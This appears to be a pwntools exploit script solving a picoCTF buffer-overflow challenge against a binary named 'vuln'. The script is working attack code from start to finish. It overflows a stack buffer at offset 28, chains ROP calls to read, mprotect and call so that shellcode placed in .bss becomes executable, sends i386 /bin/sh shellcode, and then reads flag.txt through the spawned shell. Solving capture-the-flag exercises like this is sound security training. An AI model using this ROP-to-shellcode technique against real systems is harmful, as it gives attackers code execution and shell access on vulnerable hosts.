from pwn import *

elf = ELF('./vuln')
context.arch = elf.arch
context.kernel = 'amd64'

def get_conn(env=None):
	if env is None: env = {}
	
	if args.GDB:
		return gdb.debug(elf.path, '\n'.join([
			"b *vuln+59",
			"c"
		]), env=env)
	elif args.REMOTE:
		return remote("saturn.picoctf.net", 58060)
	else:
		return process(elf.path, env=env)

p = get_conn()
r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
ia = lambda: p.interactive()
li = lambda s: log.info(s)
lw = lambda s: log.warn(s)
cl = lambda: p.clean()

OFFSET = 28
# sl(cyclic(200, n=4))

rop = ROP(elf)
rop.read(0, elf.bss(), 0x100)
rop.mprotect((elf.bss() // 0x1000) * 0x1000, 0x1000, 7)
rop.call(elf.bss())
print(rop.dump())

payload = b''.join([
	OFFSET * b'A',
	rop.chain()
])

sla(b'grasshopper', payload)
sl(asm(shellcraft.i386.linux.sh()))
sleep(3)
sl(b'cat flag.txt')
print(cl())
